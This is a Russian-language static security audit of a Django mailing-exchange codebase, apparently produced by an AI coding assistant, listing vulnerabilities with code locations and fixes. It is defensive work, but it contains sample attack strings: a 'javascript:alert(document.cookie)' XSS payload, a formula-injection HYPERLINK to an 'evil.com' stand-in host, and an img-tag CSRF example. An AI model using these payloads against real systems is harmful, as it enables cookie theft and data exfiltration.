# Полный аудит безопасности — Биржа рассылок (site_contacts)

**Дата:** 2026-03-12
**Аудитор:** Claude Code (автоматизированный анализ)
**Охват:** Полная кодовая база — views, models, forms, templates, settings, URLs, middleware

---

## Сводка

| Уровень | Кол-во | Описание |
|---------|--------|----------|
| CRITICAL | 3 | Требуют немедленного исправления |
| HIGH | 6 | Серьёзные уязвимости, исправить в ближайшее время |
| MEDIUM | 11 | Значимые проблемы, исправить планово |
| LOW | 8 | Незначительные замечания / hardening |

**SQL-инъекции: НЕ НАЙДЕНЫ.** Весь проект использует Django ORM с параметризованными запросами. Нет ни одного `cursor.execute()`, `.raw()`, `.extra()` или `RawSQL`. Все пользовательские данные проходят через ORM как keyword arguments.

---

## CRITICAL — Исправить немедленно

### C-1. Пустые AUTH_PASSWORD_VALIDATORS — принимается любой пароль

- **Файл:** `base_site/settings.py:101`
- **Код:** `AUTH_PASSWORD_VALIDATORS: list[dict] = []`
- **Суть:** Все 4 стандартных валидатора Django отключены. Пользователи могут регистрироваться с паролями "1", "a", "password". В сочетании с отсутствием rate limiting (C-3) это делает brute-force атаки тривиальными.
- **Рекомендация:** Включить минимум `MinimumLengthValidator`, `CommonPasswordValidator`, `NumericPasswordValidator`.

### C-2. Загрузка файлов в саппорт-чате без валидации

- **Файл:** `core/views.py:974-982` (`support_placeholder`) и `core/views.py:1017-1025` (`support_widget`)
- **Код:**
  ```python
  attachment = request.FILES.get("attachment")
  if text or attachment:
      SupportMessage.objects.create(
          thread=thread, sender=user, is_from_support=False,
          text=text, attachment=attachment,
      )
  ```
- **Суть:** В отличие от форм отчётов (где есть whitelist расширений и лимит 30 МБ), саппорт-чат принимает файлы ЛЮБОГО типа (`.exe`, `.html`, `.svg`, `.php`) и ЛЮБОГО размера (до `DATA_UPLOAD_MAX_MEMORY_SIZE` = 33 МБ). Это stored XSS вектор и возможность доставки малвари.
- **Рекомендация:** Создать форму с `clean_attachment()` по аналогии с `LeadReportForm`.

### C-3. Нет rate limiting ни на одном эндпоинте

- **Файлы:** `base_site/settings.py` (MIDDLEWARE), `core/urls.py`
- **Суть:** Нет `django-ratelimit`, `django-axes` или любого throttling. Уязвимы:
  - `/login/` — неограниченный brute-force (катастрофа в сочетании с C-1)
  - `/register/`, `/ref/<code>/`, `/p/<code>/` — массовое создание аккаунтов
  - `/leads/report/` — спам-подача отчётов
  - `/account/updates/` — polling API, потенциальный DoS
- **Рекомендация:** Установить `django-ratelimit` или `django-axes`. Минимум — rate limit на login и registration.

---

## HIGH — Исправить в ближайшее время

### H-1. Забаненные пользователи сохраняют доступ к аутентифицированным эндпоинтам

- **Файл:** `core/views.py:128-219` (dashboard), `core/views.py:250-290` (account_updates_api), `core/views.py:961-1040` (support)
- **Суть:** Нет глобального middleware, блокирующего забаненных пользователей. `_ensure_user_approved()` вызывается вручную только в некоторых вьюхах. Забаненный пользователь может:
  - Открыть дашборд и видеть баланс, статус вывода, количество rework лидов
  - Использовать JSON polling API `/account/updates/`
  - Создавать тикеты в саппорт и загружать файлы (без лимитов)
- **Рекомендация:** Добавить middleware, перенаправляющий забаненных на страницу "аккаунт заблокирован", с исключением для logout и (опционально) support.

### H-2. Удаление сообщения саппорта через GET (CSRF без защиты)

- **Файл:** `core/views_support_admin.py:322-331`
- **Код:**
  ```python
  @login_required
  def support_message_delete(request, pk):
      msg = get_object_or_404(SupportMessage, pk=pk)
      msg.delete()
  ```
- **Суть:** Удаление работает на любой HTTP-метод, включая GET. Django CSRF middleware проверяет токен только на POST/PUT/PATCH/DELETE. Атакующий может встроить `<img src="/support/messages/42/delete/">` — при загрузке админом сообщение удалится.
- **Рекомендация:** Добавить `@require_http_methods(["POST"])`.

### H-3. S3-креденшалы хранятся открытым текстом в БД

- **Файл:** `core/models.py` (модель `MediaStorageConfig`)
- **Поля:** `access_key_id = CharField(...)`, `secret_access_key = CharField(...)`
- **Суть:** AWS access key и secret key хранятся как plain text в базе данных. Любой пользователь Django admin, бэкап БД, или SQL-инъекция в другом месте раскроют полный доступ к S3 bucket.
- **Рекомендация:** Хранить креденшалы исключительно в переменных окружения. Использовать `django-encrypted-model-fields` если нужно в БД.

### H-4. Утечка деталей исключений пользователям

- **Файл:** `core/storage.py:130-133` — `RuntimeError` с интерполяцией `str(e)` (может содержать URL S3, имена бакетов, сетевую топологию из boto3)
- **Файл:** `core/views_support_admin.py:547-548` — полный `traceback.format_exc()` передаётся в шаблон:
  ```python
  write_result = {"ok": False, "message": str(e), "detail": traceback.format_exc()}
  ```
- **Суть:** Раскрываются пути файлов, версии библиотек, внутренние имена функций, конфигурация.
- **Рекомендация:** Логировать полные исключения серверно; показывать пользователю только generic-сообщение.

### H-5. Hardcoded fallback SECRET_KEY

- **Файл:** `base_site/settings.py:12`
- **Код:** `SECRET_KEY = os.getenv("DJANGO_SECRET_KEY", "dev-secret-key-change-in-prod")`
- **Суть:** Есть защита (RuntimeError если DEBUG=False), но если DEBUG=True в staging/pre-prod — атакующий может подделать сессии и CSRF-токены. Значение видно в публичном репозитории.
- **Рекомендация:** Генерировать случайный ключ для dev (`get_random_secret_key()`).

### H-6. Отсутствие HSTS и SSL redirect

- **Файл:** `base_site/settings.py:193-197`
- **Суть:** Production-блок устанавливает `SESSION_COOKIE_SECURE` и `CSRF_COOKIE_SECURE`, но НЕ устанавливает:
  - `SECURE_HSTS_SECONDS` — браузер не запомнит HTTPS
  - `SECURE_SSL_REDIRECT` — нет автоматического редиректа HTTP→HTTPS
  - `SECURE_HSTS_INCLUDE_SUBDOMAINS`, `SECURE_HSTS_PRELOAD`
- **Рекомендация:** Добавить `SECURE_HSTS_SECONDS = 31536000`, `SECURE_HSTS_INCLUDE_SUBDOMAINS = True`, `SECURE_SSL_REDIRECT = True`.

---

## MEDIUM — Исправить планово

### M-1. SS-админ может видеть лиды чужих команд (Cross-Tenant)

- **Файл:** `core/views_support_admin.py:130-245` (`_standalone_admin_ss_leads_impl`)
- **Код (строки 135-138):**
  ```python
  base_qs = Lead.objects.filter(
      status=Lead.Status.APPROVED,
      needs_team_contact=True,
  )  # НЕТ фильтра по standalone_admin_owner
  ```
- **Суть:** Запрос тянет ВСЕ approved leads с `needs_team_contact=True` по всей системе. Любой SS-админ видит лиды чужих SS-админов. POST-handler (строки 180-202) позволяет менять `ss_admin_status` чужих лидов.
- **Рекомендация:** Добавить фильтр по `worker__standalone_admin_owner=request.user` или аналогичный.

### M-2. SS-админ может скачать вложения чужих лидов

- **Файл:** `core/views_support_admin.py:768-781`
- **Суть:** `standalone_admin_lead_attachment` проверяет роль, но не ownership. Перебором `lead_id` можно скачать скриншоты/видео чужих лидов.
- **Рекомендация:** Добавить фильтр по принадлежности лида к команде текущего SS-админа.

### M-3. Reflected XSS через `javascript:` в параметре `next`

- **Файл:** `core/views_support_admin.py:651, 699, 1801`
- **Шаблоны:** `admin_lead_reject.html`, `admin_lead_rework.html`, `standalone_admin_assign_lead.html`
- **Суть:** `request.GET.get("next")` передаётся в шаблон без валидации. Валидация `url_has_allowed_host_and_scheme()` срабатывает только на POST-redirect пути. Django auto-escaping не блокирует `javascript:` протокол в `href`. Атака:
  ```
  /staff/leads/1/1/reject/?next=javascript:alert(document.cookie)
  ```
- **Рекомендация:** Валидировать `next_url` перед передачей в template context. Отклонять значения, не начинающиеся с `/`.

### M-4. Race condition при проверке дубликатов лидов

- **Файл:** `core/views.py:710-728` (`leads_report_placeholder`)
- **Файл:** `core/views_worker.py` (`worker_self_lead_create`)
- **Суть:** Проверка `_lead_exists_globally()` и `lead.save()` не в одной транзакции. Два одновременных запроса с одинаковым `raw_contact` оба пройдут проверку, создав дубликат. Поле `normalized_contact` имеет `db_index=True`, но НЕ `unique`.
- **Рекомендация:** Обернуть в `transaction.atomic()` или добавить `unique` constraint.

### M-5. Excel formula injection во всех экспортах

- **Файлы:** `core/views_support_admin.py:823-835, 1538-1545, 1564-1571, 1607-1619`
- **Суть:** Пользовательские данные (`raw_contact`, `source`, `comment`, `username`) записываются в Excel напрямую. Вредоносный пользователь может ввести `=HYPERLINK("http://evil.com/steal","Click")` или DDE-payload в поле лида. При открытии Excel админом формула выполнится.
- **Рекомендация:** Санитизировать значения ячеек. Добавлять `'` перед строками, начинающимися с `=`, `+`, `-`, `@`, `\t`, `\r`, `\n`.

### M-6. openpyxl XXE без defusedxml

- **Файл:** `core/views_support_admin.py:1307, 1479`
- **Код:** `wb = load_workbook(file_path, read_only=True)`
- **Суть:** Без установленного `defusedxml` openpyxl использует стандартный XML-парсер, уязвимый к XXE. Crafted .xlsx файл может прочитать `/etc/passwd`, `.env` или сделать SSRF.
- **Рекомендация:** Добавить `defusedxml` в зависимости.

### M-7. Нет верхнего лимита на ручное изменение баланса

- **Файл:** `core/views_support_admin.py:863-864`
- **Суть:** Проверка `amount > 0` есть, но верхнего предела нет. Админ может случайно или намеренно начислить миллионы.
- **Рекомендация:** Добавить max cap и аудит-лог.

### M-8. NameError в `_serve_worker_report_attachment`

- **Файл:** `core/views_support_admin.py:1689-1699`
- **Код:** `return _serve_lead_attachment(obj, request=request)` — `request` не определён как параметр функции
- **Суть:** Функция упадёт с `NameError` при любом вызове. Просмотр вложений worker-отчётов полностью сломан. В DEBUG-режиме утечка stack trace.
- **Рекомендация:** Добавить `request` как параметр функции.

### M-9. Нет проверки MIME-типа файлов (magic bytes)

- **Файл:** `core/forms.py` (все `clean_attachment()` методы)
- **Суть:** Валидация только по расширению файла. Переименование `payload.html` → `payload.jpg` обойдёт проверку. При отдаче с неверным Content-Type — XSS.
- **Рекомендация:** Использовать `python-magic` для проверки реального MIME-типа.

### M-10. Content-Disposition header injection

- **Файл:** `core/views_support_admin.py:751-753`
- **Код:** `response["Content-Disposition"] = f'inline; filename="{filename}"'`
- **Суть:** Filename из БД подставляется без санитизации. Двойные кавычки или CRLF в имени файла — header injection.
- **Рекомендация:** Санитизировать filename или использовать RFC 5987 `filename*`.

### M-11. Django admin на стандартном `/admin/` пути

- **Файл:** `base_site/urls.py:8`
- **Суть:** Автоматические сканеры найдут мгновенно. Должен быть на нестандартном пути + IP-ограничения.

---

## LOW — Рекомендации по усилению

### L-1. Нет Content-Security-Policy (CSP) заголовка

- Inline JavaScript в ~20 шаблонах делает внедрение строгого CSP невозможным без `'unsafe-inline'`. Рекомендуется постепенно мигрировать скрипты в отдельные `.js` файлы и внедрить nonce-based CSP.

### L-2. `is_staff` флаг даёт полный доступ к админ-панели приложения

- `_require_support()` и `_is_admin()` проверяют `user.is_staff`, что эквивалентно role=admin. Если SS-админу или воркеру дать `is_staff=True` для Django admin — он получит доступ ко всей админ-панели приложения.

### L-3. HTTP-origins в CSRF_TRUSTED_ORIGINS

- **Файл:** `base_site/settings.py:24-30`
- Для production-хостов добавляются и `https://` и `http://` origins. В production следует оставить только `https://`.

### L-4. SESSION_COOKIE_HTTPONLY и SAMESITE не заданы явно

- Django defaults (`True` и `"Lax"`) корректны, но лучше задать явно для защиты от случайных изменений.

### L-5. Logout не требует `@login_required`

- **Файл:** `core/views.py:293-297`
- POST-only и CSRF-protected — практической угрозы нет, но лишняя нагрузка на сервер.

### L-6. ThreadPoolExecutor в WSGI-процессе

- **Файл:** `core/views.py:33`
- Background-треды убиваются при recycling Gunicorn-воркера. Нет лимита на глубину очереди — burst видео-загрузок может исчерпать память.
- **Рекомендация:** Использовать Celery или Django-Q.

### L-7. Забаненные пользователи могут слать файлы в саппорт без лимитов

- Возможно по дизайну (апелляция бана), но нет rate limit и size limit для забаненных.

### L-8. Debug-инструкции в ответах ошибок

- **Файл:** `core/views_support_admin.py:504-512`
- Возвращает HTML с инструкциями `python manage.py migrate` — раскрытие технологического стека.

---

## Положительные находки (что сделано правильно)

| Аспект | Статус |
|--------|--------|
| SQL-инъекции | **Нет.** Только ORM с параметрами |
| CSRF-защита | **Включена глобально.** Нет `@csrf_exempt` нигде |
| IDOR на лидах пользователей | **Защищено.** `get_object_or_404(Lead, pk=id, user=user)` |
| Open redirect | **Защищено.** `url_has_allowed_host_and_scheme()` везде |
| Транзакции на балансах | **Корректно.** `transaction.atomic()` + `select_for_update()` |
| Массовое присвоение (mass assignment) | **Защищено.** Все формы используют явные `fields = (...)` |
| Logout через POST | **Корректно.** `@require_http_methods(["POST"])` |
| UUID в путях загрузок | **Корректно.** Предотвращает path traversal |
| Subprocess без shell=True | **Корректно.** ffmpeg-вызовы через list arguments |
| `|escapejs` в template scripts | **Корректно.** Шаблонные переменные в `<script>` экранированы |
| `mark_safe()` с `escape()` | **Корректно.** Единственное использование в `contact_link` фильтре с двойным escape |
| `SECRET_KEY` guard в production | **Корректно.** RuntimeError если default key + DEBUG=False |
| `.env` в .gitignore | **Корректно.** Не попал в git history |

---

## Приоритетный план исправлений

| # | Находка | Усилие | Приоритет |
|---|---------|--------|-----------|
| 1 | C-1: Включить валидаторы паролей | 5 мин | Немедленно |
| 2 | C-2: Валидация файлов в саппорт-чате | 30 мин | Немедленно |
| 3 | H-2: `@require_POST` на удаление сообщений | 2 мин | Немедленно |
| 4 | M-8: Починить NameError в worker report attachment | 5 мин | Немедленно |
| 5 | C-3: Rate limiting (`django-axes` / `django-ratelimit`) | 1-2 часа | Эта неделя |
| 6 | H-1: Middleware для забаненных пользователей | 1 час | Эта неделя |
| 7 | M-1/M-2: Ограничить SS-лиды по tenant | 30 мин | Эта неделя |
| 8 | M-3: Валидировать `next_url` перед рендером | 15 мин | Эта неделя |
| 9 | H-4: Убрать детали исключений из ответов | 20 мин | Эта неделя |
| 10 | M-5: Санитизация Excel-экспорта | 30 мин | Эта неделя |
| 11 | H-6: Добавить HSTS + SSL redirect | 5 мин | Эта неделя |
| 12 | M-4: Атомарная проверка дубликатов | 1 час | Этот месяц |
| 13 | M-6: Установить defusedxml | 5 мин | Этот месяц |
| 14 | H-5: Убрать hardcoded SECRET_KEY | 10 мин | Этот месяц |
| 15 | H-3: Убрать S3 креды из БД | 1-2 часа | Этот месяц |
| 16 | M-9: Проверка MIME magic bytes | 1-2 часа | Этот месяц |
| 17 | M-10: Санитизация Content-Disposition | 15 мин | Этот месяц |
| 18 | M-11: Перенести Django admin на нестандартный путь | 10 мин | Этот месяц |
| 19 | L-1: Внедрить CSP (начать с report-only) | 2-4 часа | Планово |
| 20 | L-6: Заменить ThreadPoolExecutor на Celery | 4-8 часов | Планово |

---

*Аудит выполнен статическим анализом кода. Рекомендуется дополнить динамическим тестированием (DAST) и penetration testing.*
